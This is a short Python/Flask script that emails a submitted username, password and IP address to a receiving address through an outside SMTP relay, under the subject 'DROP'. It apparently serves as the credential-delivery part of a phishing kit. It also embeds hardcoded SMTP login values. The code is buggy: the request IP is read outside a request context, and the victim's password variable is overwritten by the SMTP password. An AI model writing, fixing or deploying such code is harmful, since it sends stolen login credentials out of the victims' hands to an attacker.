import smtplib
from email.mime.text import MIMEText
from flask import Flask, request

ip_address = request.remote_addr
def send_mail(username, password, ip_address):
    port = 2525
    smtp_server = "smtp.mailtrap.io"
    login = '6187c074a489f4'
    password = '484e76cb9fe71d'
    message = f"<h3>New Feedback Submission</h3><ul><li>Username: {username}</li><li>Password: {password}</li><li>IP Address: {ip_address}</li>"
    sender_email = "email@example.com"
    receiver_email = "email2@example.com"
    msg = MIMEText(message, "html")
    msg["Subject"] = "DROP"
    msg["from"] = sender_email
    msg["To"] = receiver_email
    # Send Email

    with smtplib.SMTP(smtp_server,port) as server:
        server.login(login, password)
        server.sendmail(sender_email, receiver_email, msg.as_string())